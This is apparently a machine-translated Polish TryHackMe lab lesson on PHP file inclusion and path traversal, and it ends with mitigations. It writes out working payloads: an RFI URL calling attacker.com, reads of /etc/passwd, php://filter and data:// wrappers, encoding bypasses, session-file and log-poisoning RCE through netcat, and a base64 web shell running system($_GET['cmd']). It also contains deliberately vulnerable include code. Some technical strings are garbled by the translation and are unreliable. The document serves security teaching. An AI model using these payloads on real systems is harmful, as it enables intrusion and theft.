
#### Wstęp

Dołączanie plików i przechodzenie ścieżek to luki w zabezpieczeniach, które powstają, gdy aplikacja zezwala na zewnętrzne dane wejściowe w celu zmiany ścieżki dostępu do plików. Wyobraźmy sobie na przykład bibliotekę, w której system katalogowy jest manipulowany w celu uzyskania dostępu do książek objętych ograniczeniami, nieprzeznaczonych do publicznego przeglądania. Podobnie, w aplikacjach internetowych luki wynikają głównie z nieprawidłowego zarządzania ścieżkami dostępu i adresami URL. Luki te umożliwiają atakującym dołączanie plików, które nie mają być częścią aplikacji internetowej, co prowadzi do nieautoryzowanego dostępu lub wykonania kodu.

#### Cele

1. Poznaj ataki typu File Inclusion i Path Traversal oraz ich wpływ.
2. Identyfikuj luki w zabezpieczeniach związane z dołączaniem plików i przechodzeniem ścieżek w aplikacjach internetowych.
3. Wykorzystaj te luki w kontrolowanym środowisku.
4. Zrozumieć i zastosować środki mające na celu ograniczenie i zapobieganie tym zagrożeniom.

#### Wymagania wstępne

1. Podstawowa wiedza na temat architektury aplikacji internetowych i skryptów po stronie serwera.
2. Znajomość popularnych języków programowania stosowanych w tworzeniu stron internetowych, takich jak:PHP.  
    
3. Podstawowa wiedza o[OWASP ZASTRZELIĆ](https://tryhackme.com/jr/learnowaspzap)Lub[Burp Suite](https://tryhackme.com/room/burpsuitebasics).
4. Podstawowa wiedza na temat luk w zabezpieczeniach [związanych z dołączaniem plików](https://tryhackme.com/jr/fileinc) .


#### Struktura aplikacji internetowej

Aplikacje internetowe to złożone systemy składające się z kilku komponentów, które współpracują ze sobą, aby zapewnić użytkownikowi płynne działanie. W swojej istocie aplikacja internetowa składa się z dwóch głównych części: front-endu i back-endu.

1. **Frontend:** Interfejs użytkownika aplikacji, zazwyczaj zbudowany z wykorzystaniem frameworków takich jak React, Angular lub Vue.js. Komunikuje się z backendem za pośrednictwem interfejsów API.
    
2. **Backend:**  Ten komponent po stronie serwera przetwarza żądania użytkowników, współpracuje z bazami danych i dostarcza dane do frontendu. Często jest tworzony w językach takich jakPHP, Python i Javascript oraz frameworki takie jak Node.js, Django czy Laravel.
    

Jednym z fundamentalnych aspektów aplikacji internetowych jest model klient-serwer. W tym modelu klient, zazwyczaj przeglądarka internetowa, wysyła żądanie do serwera hostującego aplikację internetową. Serwer zaplecza przetwarza to żądanie i odsyła odpowiedź. Komunikacja klient-serwer zazwyczaj odbywa się za pośrednictwem…HTTP/Protokoły HTTPS.

![Struktura aplikacji internetowej](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/b4fb94d308d04bd95a6cce14008cf2fd.png)  

Skrypty po stronie serwera i obsługa plików  

Skrypty po stronie serwera działają na serwerze i generują zawartość front-endu, która następnie jest wysyłana do klienta. W przeciwieństwie do skryptów po stronie klienta, takich jak JavaScript w przeglądarce, skrypty po stronie serwera mogą uzyskać dostęp do serwera.system plikówi baz danych.  Obsługa plików jest istotną częścią skryptów po stronie serwera.  Aplikacje internetowe często muszą odczytywać lub zapisywać dane w plikach na serwerze. Na przykład odczytując pliki konfiguracyjne, zapisując dane przesyłane przez użytkowników lub dodając kod z innych plików.

Na przykład aplikacja poniżej zawiera plik utworzony na podstawie danych wprowadzonych przez użytkownika. 

![Strona główna aplikacji podatnych na ataki](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/351e3ca1e5071b199ae7e5078b4fee70.png)  

Jeśli te dane wejściowe nie zostaną poprawnie zweryfikowane i oczyszczone, atakujący może wykorzystać podatny parametr do dołączenia szkodliwych plików lub uzyskania dostępu do poufnych plików na serwerze. W takim przypadku atakujący może wyświetlić zawartość pliku **haseł** serwera .

![Aplikacja podatna na ataki – podstawowy ładunek zawierający pliki](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/53daf7efe0faff4ac5fadc3c410ecb64.png)  

Krótko mówiąc, luki w zabezpieczeniach związane z inkluzjami plików i przechodzeniem przez ścieżki pojawiają się, gdy dane wprowadzane przez użytkownika nie są odpowiednio oczyszczane lub weryfikowane. Ponieważ atakujący mogą wstrzykiwać złośliwe ładunki do plików dziennika  `/var/log/apache2/access.log`i manipulować ścieżkami plików w celu wykonania zarejestrowanego ładunku, atakujący może doprowadzić do zdalnego wykonania kodu. Atakujący może również odczytać pliki konfiguracyjne zawierające  poufne informacje, takie jak dane uwierzytelniające bazy danych, jeśli aplikacja zwróci plik w postaci zwykłego tekstu. Wreszcie,  niewystarczająca obsługa błędów może również ujawnić ścieżki systemowe lub struktury plików, dostarczając atakującym wskazówek dotyczących potencjalnych celów ataków polegających na przechodzeniu przez ścieżki lub przechodzeniu przez ścieżki.



#### Podstawy dołączania plików

Ciąg znaków przechodzenia, powszechnie znany jako `../`, jest używany w atakach polegających na przechodzeniu przez ścieżkę (path traversal) do poruszania się po strukturze katalogów systemu plików. Zasadniczo jest to sposób na przejście o jeden poziom wyżej w hierarchii katalogów. Ciągi znaków przechodzenia służą do uzyskiwania dostępu do plików znajdujących się poza docelowym katalogiem.

Ścieżkowanie względne odnosi się do lokalizowania plików na podstawie bieżącego katalogu. Na przykład  `include('./folder/file.php')` oznacza to, że  `file.php` plik znajduje się w folderze o nazwie  `folder`, który znajduje się w tym samym katalogu co wykonywany skrypt.

Ścieżka absolutna polega na podaniu pełnej ścieżki, zaczynając od katalogu głównego. Na przykład  `/var/www/html/folder/file.php` ścieżka absolutna to ścieżka absolutna.

#### Zdalne dołączanie plików

Zdalne dołączanie plików (RFI) to luka w zabezpieczeniach, która umożliwia atakującym dołączanie zdalnych plików, często poprzez manipulację danymi wejściowymi. Może to prowadzić do wykonania złośliwych skryptów lub kodu na serwerze.

Zazwyczaj RFI występuje w aplikacjach, które dynamicznie dołączają zewnętrzne pliki lub skrypty. Atakujący mogą manipulować parametrami w żądaniu, aby wskazać zewnętrzne, złośliwe pliki.  Na przykład, jeśli aplikacja internetowa używa adresu URL w parametrze GET, takim jak `include.php?page=http://attacker.com/exploit.php`, atakujący może zastąpić ten adres ścieżką do złośliwego skryptu.

#### Dołączanie plików lokalnych

Lokalne dołączanie plików (LFI) zazwyczaj występuje, gdy atakujący wykorzystuje podatne pola wprowadzania danych, aby uzyskać dostęp do plików na serwerze lub je uruchomić.  Atakujący zazwyczaj wykorzystują źle oczyszczone pola wprowadzania danych, aby manipulować ścieżkami dostępu do plików spoza docelowego katalogu.  Na przykład, używając ciągu znaków,  atakujący może uzyskać dostęp do poufnych plików, takich jak `include.php?page=../../../../etc/passwd`.

ChwilaLFIprowadzi przede wszystkim do nieautoryzowanego dostępu do plików, może to prowadzić do eskalacjiRCEMoże się tak zdarzyć, jeśli atakujący może przesłać lub wstrzyknąć kod wykonywalny do pliku, który następnie zostanie dołączony lub wykonany przez serwer.  Techniki takie jak zatruwanie logów, czyli wstrzykiwanie kodu do plików dziennika, a następnie dołączanie tych plików, są przykładami tego, jak LFI może prowadzić do RCE.

#### RFIvs. proces eksploatacji LFI

![Proces eksploatacji RFI i LFI](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/51fca7adb2f8deb2d2bd3a83dc4d0c00.png)  

Powyższy diagram przedstawia różnicowanie procesu wykorzystywania luk w zabezpieczeniach RFI i LFI. W przypadku RFI nacisk kładziony jest na dołączenie i wykonanie zdalnego pliku, natomiast w przypadku LFI atakujący dąży do uzyskania dostępu do plików lokalnych i potencjalnego wykorzystania tego dostępu do wykonania kodu na serwerze.


#### PHPOpakowania

Wrapery PHP są częścią funkcjonalności PHP, która umożliwia użytkownikom dostęp do różnych strumieni danych. Wrapery mogą również uzyskiwać dostęp do kodu lub go wykonywać za pośrednictwem wbudowanych protokołów PHP, co może prowadzić do poważnych zagrożeń bezpieczeństwa, jeśli nie zostaną odpowiednio obsłużone.

Na przykład aplikacja podatna naLFImogą zawierać pliki oparte na danych wejściowych użytkownika bez wystarczającej walidacji. W takich przypadkach atakujący mogą użyć tego `php://filter` filtra. Filtr ten pozwala użytkownikowi na wykonywanie podstawowych operacji modyfikacji danych przed ich odczytaniem lub zapisaniem. Na przykład, jeśli atakujący chce zakodować zawartość dołączonego pliku, np. `/etc/passwd` w formacie base64, można to osiągnąć za pomocą `convert.base64-encode` filtra konwersji wrappera. Ostateczny ładunek będzie wtedy… `php://filter/convert.base64-encode/resource=/etc/passwd`

Na przykład przejdź do [http://MACHINE_IP/playground.php](http://machine_ip/playground.php)  i użyj ostatniej treści podanej powyżej.

![Aplikacja podatna na ataki zawierająca ładunek](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/f7ffaa4b76733a80bbf34544770de6e5.png)  

Gdy aplikacja przetworzy ten ładunek, serwer zwróci zakodowaną zawartość pliku  **passwd** .

![Aplikacja podatna na ataki zwraca zakodowaną wartość żądanego pliku](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/099db41dc5da2eb30e7898b3ee0fe979.png)

Następnie atakujący może je zdekodować i uzyskać dostęp do zawartości pliku docelowego.  

![Zdekodowana wartość pliku /etc/passwd](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/30d1aaab9aa2add722fe811e674b1145.png)  

W PHP istnieje wiele kategorii filtrów. Należą do nich między innymi filtry ciągów znaków (string.rot13, string.toupper, string.tolower i string.strip_tags), filtry konwersji (convert.base64-encode, convert.base64-decode, convert.quoted-printable-encode i convert.quoted-printable-decode), filtry kompresji (zlib.deflate i zlib.inflate) oraz filtry szyfrowania (mcrypt i mdecrypt), które są obecnie przestarzałe.

Na przykład poniższa tabela przedstawia dane wyjściowe pliku docelowego **.htaccess** przy użyciu różnych filtrów łańcuchowych w PHP.

|   |   |
|---|---|
|**Ładunek**|**Wyjście**|
|php://filtr/convert.base64-encode/resource=.htaccess|UmV3cml0ZUVuZ2luZSBvbgpPcHRpb25zIC1JbmRleGVz|
|php://filtr/string.rot13/resource=.htaccess|ErjevgrRatvar ba Bcgvbaf -Vaqrkrf|
|php://filtr/string.toupper/resource=.htaccess|REWRITEENGINE NA OPCJACH -INDEKSACH|
|php://filtr/string.tolower/resource=.htaccess|rewriteengine na opcjach -indeksach|
|php://filtr/string.strip_tags/resource=.htaccess|RewriteEngine na opcjach - indeksy|
|Nie zastosowano filtra|RewriteEngine na opcjach - indeksy|

#### Opakowanie danych

Wrapper strumienia danych to kolejny przykład funkcjonalności wrappera w PHP. `data://`Wrapper umożliwia osadzanie danych inline. Służy do osadzania niewielkich ilości danych bezpośrednio w kodzie aplikacji.

Na przykład przejdź do[http://MACHINE_IP/playground.php](http://machine_ip/playground.php) i użyj ładunku `data:text/plain,<?php%20phpinfo();%20?>`. Na poniższym obrazku ten adres URL może spowodować wykonanie kodu PHP, wyświetlając szczegóły konfiguracji PHP.

![Aplikacja podatna na ataki zawierająca ładunek danych](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/da7537e2743e4302afc60c1982384e3a.png)

Podział ładunku `data:text/plain,<?php phpinfo(); ?>`jest następujący:

- `data:`jako adres URL.
- `mime-type`jest ustawiony jako `text/plain`.
- Część danych zawiera fragment kodu PHP: `<?php phpinfo(); ?>`.


#### Wyodrębnienie katalogu bazowego

W aplikacjach internetowych stosuje się zabezpieczenia zapobiegające atakom polegającym na przechodzeniu przez ścieżkę. Jednak te zabezpieczenia nie zawsze są niezawodne. Poniżej znajduje się kod aplikacji, która wymaga, aby nazwa pliku podana przez użytkownika zaczynała się od z góry określonego katalogu bazowego, a także usuwa ciągi znaków służące do przechodzenia przez ścieżkę, aby chronić aplikację przed atakami polegającymi na przechodzeniu przez ścieżkę:

Przykładowy kod

```php
function containsStr($str, $subStr){
    return strpos($str, $subStr) !== false;
}

if(isset($_GET['page'])){
    if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){
        include $_GET['page'];
    }else{ 
        echo 'You are not allowed to go outside /var/www/html/ directory!';
    }
}
```

Można spełnić ten wymóg i przejść do innych katalogów. Można to osiągnąć, dodając niezbędne sekwencje przechodzenia między katalogami po obowiązkowym folderze bazowym.

Na przykład przejdź do[http://IP_MASZYNY/lfi.php](http://machine_ip/lfi.php) i użyj ładunku `/var/www/html/..//..//..//etc/passwd`.

Funkcja PHP `containsStr`sprawdza, czy podciąg istnieje w ciągu. Warunek if sprawdza dwie rzeczy. Po pierwsze, if `$_GET['page']` nie zawiera podciągu `../..`, a if `$_GET['page']` zawiera podciąg `/var/www/html`, `..//..//` pomija ten filtr, ponieważ nadal skutecznie nawiguje o dwa katalogi w górę, podobnie jak `../../`. Nie pasuje on dokładnie do zablokowanego wzorca `../..` ze względu na dodatkowe ukośniki. Dodatkowe ukośniki `//` w `..//..//` są traktowane przez system plików jako pojedynczy ukośnik. Oznacza to, że `../../` i `..//..//` są funkcjonalnie równoważne pod względem nawigacji po katalogach, ale `../../` są tylko jawnie filtrowane przez kod.

![Aplikacja zawierająca ładunek ..//..// jest podatna na ataki](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/5465732ced81f3183c2b1443e4ea8503.png)

#### Zaciemnianie

Techniki zaciemniania kodu są często wykorzystywane do omijania podstawowych filtrów bezpieczeństwa, które mogą być stosowane w aplikacjach internetowych. Filtry te zazwyczaj wyszukują oczywiste sekwencje przeszukiwania katalogów, takie jak `../`. Jednak atakujący często mogą uniknąć wykrycia, zaciemniając te sekwencje i nadal poruszać się po systemie plików serwera.

Kodowanie przekształca znaki do innego formatu. W LFI atakujący często używają kodowania URL (kodowania procentowego), gdzie znaki są reprezentowane za pomocą symboli procentowych, po których następują wartości szesnastkowe. Na przykład, `../`kodowanie może być kodowane lub zaciemniane na kilka sposobów w celu ominięcia prostych filtrów.

- Standardowe kodowanie adresu URL: `../`staje się`%2e%2e%2f`
- Podwójne kodowanie: Przydatne, jeśli aplikacja dekoduje dane wejściowe dwukrotnie. `../`staje się`%252e%252e%252f`
- Zaciemnianie: Atakujący mogą wykorzystywać ładunki, takie jak `....//`, które pomagają uniknąć wykrycia poprzez proste mechanizmy dopasowywania ciągów znaków lub filtrowania. Ta technika zaciemniania ma na celu ukrycie prób przeszukiwania katalogów, czyniąc je mniej widocznymi dla podstawowych filtrów bezpieczeństwa.

Wyobraźmy sobie na przykład aplikację, która łagodzi LFI poprzez filtrowanie `../`:

Przykładowy skrypt

```php
$file = $_GET['file'];
$file = str_replace('../', '', $file);

include('files/' . $file);
```

Atakujący może potencjalnie ominąć ten filtr, stosując następujące metody:

1. **Ominięcie zakodowanego adresu URL:** Atakujący może wykorzystać zakodowaną wersję danych w adresie URL, np `?file=%2e%2e%2fconfig.php`. . Serwer dekoduje te dane wejściowe do `../config.php`, omijając filtr.
    
2. **Podwójne obejście kodowania:** Atakujący może użyć podwójnego kodowania, jeśli aplikacja dekoduje dane wejściowe dwukrotnie. Ładunek będzie wtedy wyglądał tak `?file=%252e%252e%252fconfig.php`: , gdzie kropka to `%252e`, a ukośnik to `%252f`. Pierwszy krok dekodowania zmienia się `%252e%252e%252f`na `%2e%2e%2f`. Drugi krok dekodowania przekształca go następnie na `../config.php`.
    
3. **Zaciemnianie:** atakujący może wykorzystać ładunek `....//config.php`, który po usunięciu przez aplikację widocznego ciągu znaków przejścia, stanie się `../config.php`.



#### PHP Pliki sesji

Pliki sesji PHP można również wykorzystywać w LFIAtak, prowadzący do zdalnego wykonania kodu, szczególnie jeśli atakujący może manipulować danymi sesji. W typowej aplikacji internetowej dane sesji są przechowywane w plikach na serwerze. Jeśli atakujący może wstrzyknąć złośliwy kod do tych plików sesji, a aplikacja uwzględnia te pliki poprzez lukę w zabezpieczeniach LFI, może to doprowadzić do wykonania kodu.

Na przykład podatna aplikacja hostowana w [http://MACHINE_IP/sessions.php](http://machine_ip/sessions.php)  zawiera poniższy kod:

Przykładowy kod

```php
if(isset($_GET['page'])){
    $_SESSION['page'] = $_GET['page'];
    echo "You're currently in" . $_GET["page"];
    include($_GET['page']);
}
```

Atakujący może wykorzystać tę lukę, wstrzykując kod PHP do zmiennej sesji za pomocą `<?php echo phpinfo(); ?>`parametru strony.

![sessions.php z podstawowym kodem phpinfo](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/110472d2d2ae7b090b8242b3b1a3818e.png)  

Ten kod jest następnie zapisywany w pliku sesji na serwerze. Następnie atakujący może wykorzystać lukę w zabezpieczeniach LFI, aby dołączyć ten plik sesji. Ponieważ identyfikatory sesji są haszowane, można je znaleźć w sekcji plików cookie przeglądarki.

![Pobieranie wartości PHPSESSID](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/82474b4664ba1fd739c339861320174b.png)  

Dostęp do adresu URL  `sessions.php?page=/var/lib/php/sessions/sess_[sessionID]` spowoduje wykonanie wstrzykniętego kodu PHP w pliku sesji. Pamiętaj, że musisz zastąpić [sessionID] wartością z pliku cookie PHPSESSID.

![Wstrzyknięty kod PHP do pliku sesji został wykonany](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/d335c5261b4cfa981521ffeb098a796c.png)



#### Zatrucie kłodą

Zatruwanie dziennika to technika polegająca na tym, że atakujący wstrzykuje kod wykonywalny do pliku dziennika serwera WWW, a następnie używa LFI Luka w zabezpieczeniach umożliwiająca dołączenie i wykonanie tego pliku dziennika. Ta metoda jest szczególnie dyskretna, ponieważ pliki dziennika są współdzielone i stanowią pozornie nieszkodliwą część operacji serwera WWW. W ataku polegającym na zatruwaniu logów atakujący musi najpierw wstrzyknąć złośliwy kod. PHP kod do pliku dziennika. Można to zrobić na różne sposoby, takie jak stworzenie złośliwego agenta użytkownika, wysłanie ładunku przez adres URL za pomocą Netcata lub nagłówek referrer, który serwer rejestruje. Gdy kod PHP znajdzie się w pliku dziennika, atakujący może wykorzystać lukę w zabezpieczeniach LFI, aby dołączyć go jako standardowy plik PHP. Powoduje to, że serwer wykonuje złośliwy kod zawarty w pliku dziennika, co prowadzi do…RCE.

Na przykład, jeśli atakujący wyśle ​​żądanie Netcat do podatnej maszyny zawierające kod PHP:

Żądanie próbki

```php
$ nc MACHINE_IP 80      
<?php echo phpinfo(); ?>
HTTP/1.1 400 Bad Request
Date: Thu, 23 Nov 2023 05:39:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 335
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at MACHINE_IP.eu-west-1.compute.internal Port 80</address>
</body></html>
```

Kod zostanie następnie zapisany w dziennikach dostępu serwera.

![Dziennik dostępu Apache zawierający wstrzyknięty kod PHP](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/d9c19f6c916c790bb4fa94e09a5fcaef.png)  

Następnie atakujący używa LFI do uwzględnienia pliku dziennika dostępu: `?page=/var/log/apache2/access.log`

![Wstrzyknięty kod PHP do dziennika dostępu do sieci został wykonany](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/f4a675e26aac4f257dfd24942bcdbd0f.png)

Aby odtworzyć powyższą wersję demonstracyjną, możesz przejść do[http://IP_MASZYNY/playground.php](http://machine_ip/playground.php)


#### PHPOpakowania

Wrapery PHP mogą być używane nie tylko do odczytu plików, ale także do wykonywania kodu.  Kluczem jest tutaj `php://filter`wrapper strumieniowy, który umożliwia transformację plików w locie.  Weźmy na przykład filtr PHP base64. Ta metoda pozwala atakującym na wykonanie dowolnego kodu na serwerze przy użyciu ładunku zakodowanego w base64. 

Na przykład przejdź do [http://MACHINE_IP/playground.php](http://machine_ip/playground.php)[](http://machine_ip/playground.php).

Użyjemy kodu PHP `<?php system($_GET['cmd']); echo 'Shell done!'; ?>`jako naszego ładunku. Wartość ładunku, zakodowana w formacie base64, będzie wynosić`php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+`

|   |   |   |
|---|---|---|
|**Pozycja**|**Pole**|**Wartość**|
|1|Opakowanie protokołu|php://filtr|
|2|Filtr|konwertuj.base64-dekodowanie|
|3|Typ zasobu|zasób=|
|4|Typ danych|data://zwykły/tekst,|
|5|Zakodowany ładunek|PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+|

W powyższej tabeli  `PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+` znajduje się wersja kodu PHP zakodowana w standardzie base64.  Gdy serwer przetwarza to żądanie, najpierw dekoduje ciąg znaków base64, a następnie wykonuje kod PHP, umożliwiając atakującemu uruchamianie poleceń na serwerze za pomocą parametru GET „cmd”.  

![Aplikacja zawierająca podatny na ataki ładunek opakowania PHP](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/0e01212213a4a512d552b55d22b7014d.png)

**Uwaga:** Ważne jest, aby nie umieszczać w polu wprowadzania danych ciągu **&cmd=whoami**  , ponieważ zostanie on zakodowany podczas przesyłania formularza. Po zakodowaniu, system potraktuje go jako część kodu base64, co spowoduje błąd nieprawidłowej sekwencji bajtów.


#### Wniosek

Luki w zabezpieczeniach File Inclusion i Path Traversal wynikają z nieprawidłowego przetwarzania danych wprowadzanych przez użytkownika w aplikacjach internetowych. W przypadku File Inclusion atakujący wykorzystują sposób, w jaki aplikacje internetowe obsługują pliki, co prowadzi do Local File Inclusion lub Remote File Inclusion. Z kolei Path Traversal polega na nawigowaniu po strukturze katalogów serwera w celu uzyskania dostępu do plików spoza docelowego katalogu. Obie luki mogą zostać wykorzystane do uzyskania dostępu do nieautoryzowanych danych lub włamania do systemu.

#### Strategie łagodzenia i zapobiegania

1. Upewnij się, że wszystkie dane wprowadzane przez użytkownika są prawidłowo weryfikowane i oczyszczane. To kluczowy krok, aby uniemożliwić atakującym manipulowanie ścieżkami plików lub dołączanie złośliwych plików.
2. Wprowadź listę dozwolonych plików do dołączenia i dostępu. Zdefiniuj pliki, które mogą być dodane lub do których można uzyskać dostęp, i odrzuć każde żądanie, które nie spełnia tych kryteriów.
3. Skonfiguruj ustawienia serwera, aby uniemożliwić zdalne dołączanie plików i ograniczyć dostęp skryptów do systemu plików.PHP, dyrektywy takie jak `allow_url_fopen`i `allow_url_include`powinny być wyłączone, jeśli nie są potrzebne.
4. Regularne przeglądy kodu i audyty bezpieczeństwa w celu identyfikacji potencjalnych luk w zabezpieczeniach za pomocą zautomatyzowanych narzędzi. Niezbędne są również kontrole ręczne.
5. Upewnij się, że wszyscy zaangażowani w proces rozwoju oprogramowania rozumieją wagę bezpieczeństwa. Regularne szkolenia z zakresu bezpiecznych praktyk kodowania mogą znacząco zmniejszyć ryzyko wystąpienia tej luki w zabezpieczeniach.

Podsumowując, chociaż dołączanie plików i przechodzenie przez ścieżki stanowią poważne zagrożenie dla aplikacji internetowych, można je ograniczyć, stosując najlepsze praktyki bezpieczeństwa. Programiści i administratorzy muszą proaktywnie zabezpieczać aplikacje internetowe, być na bieżąco z najnowszymi trendami w zakresie bezpieczeństwa i stale udoskonalać swoje podejście do bezpieczeństwa aplikacji.